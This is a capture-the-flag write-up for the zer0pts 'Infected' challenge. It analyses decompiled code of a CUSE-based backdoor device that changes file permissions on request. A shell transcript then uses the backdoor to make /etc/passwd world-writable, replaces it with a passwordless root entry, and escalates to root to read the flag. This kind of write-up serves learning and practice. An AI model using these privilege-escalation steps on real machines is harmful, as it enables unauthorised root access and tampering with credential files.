# Infected

The backdoor is installed on this machine:

`nc others.ctf.zer0pts.com 11011`

How can I use it to get the flag in `/root` directory?

Attachments:
* [backdoor](./backdoor)

## Solution
- ELF 64-bit LSB pie executable, opened in IDA.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return register_backdoor((unsigned int)argc, argv);
}
```
`register_backdoor` Function
```c
__int64 __fastcall register_backdoor(unsigned int a1, __int64 a2)
{
  v7[0] = (__int64)"DEVNAME=backdoor";
  memset(s, 0, 0x20uLL);
  v4 = 1;
  v5 = v7;
  v6 = 1;
  return cuse_lowlevel_main(a1, a2, s, &devops, 0LL);
}
```
- The program uses `FUSE` to create a character device name `backdoor`. The struct `devops` passed has pointer to open (`backdoor_open`) and write (`backdoor_write`) functions.

Write function `backdoor_write`
```c
unsigned __int64 __fastcall backdoor_write(__int64 a1, const char *a2, size_t a3)
{
  s = strndup(a2, a3);
  if ( s )
  {
    s1 = strtok(s, ":");
    file = strtok(0LL, ":");
    nptr = strtok(0LL, ":");
    if ( s1 && file && nptr && !strncmp(s1, "b4ckd00r", 8uLL) )
    {
      stat64(file, &v10);
      if ( (v10.st_mode & 0xF000) != 0x8000 || (v3 = atoi(nptr), chmod(file, v3)) )
        fuse_reply_err(a1, 22LL);
      else
        fuse_reply_write(a1, a3);
    }
    else
    {
      fuse_reply_err(a1, 22LL);
    }
    free(s);
  }
  else
  {
    fuse_reply_err(a1, 22LL);
  }
  return __readfsqword(0x28u) ^ v11;
}
```
This function 1st splits the input into 3 parts with `:` , then:
- Checks if 1st part is `b4ckd00r`
- Then checks the 2nd part is a file and the file must be a regular file (using stat64)
- Then it changes the permissions of the file (using chmod)

**Solution**

We are given connection to a busybox shell, and we can't do sudo as we aren't in the passwd file. So, changed the permissions of `/etc/passwd` file to rwx (777 in octal == 511 in decimal), changed the password of root to null.

```
Opening connection to others.ctf.zer0pts.com on port 11011: Done
[*] Data sha256("????U86hWW.VnLdYpMpr.Ovl") = df2586d94b5a0a315366ca06ce4b3398e7b2d88e0cc45ffa220ca1855ff031e2
[*] Suffix = U86hWW.VnLdYpMpr.Ovl Hash: df2586d94b5a0a315366ca06ce4b3398e7b2d88e0cc45ffa220ca1855ff031e2
[*] Prefix = 43xb
[*] Got Shell
[*] Switching to interactive mode
[+] Correct
/ $ echo b4ckd00r:/etc/passwd:511 > /dev/backdoor
echo b4ckd00r:/etc/passwd:511 > /dev/backdoor
/ $ echo root::0:0:root:/root:/bin/sh > /etc/passwd
echo root::0:0:root:/root:/bin/sh > /etc/passwd
/ $ cat /etc/passwd
cat /etc/passwd
root::0:0:root:/root:/bin/sh
/ $ su
su
/ # cat /root/flag*
$ 
cat /root/flag*
zer0pts{exCUSE_m3_bu7_d0_u_m1nd_0p3n1ng_7h3_b4ckd00r?}
/ #
[*] Interrupted
```

## Flag
> zer0pts{exCUSE_m3_bu7_d0_u_m1nd_0p3n1ng_7h3_b4ckd00r?}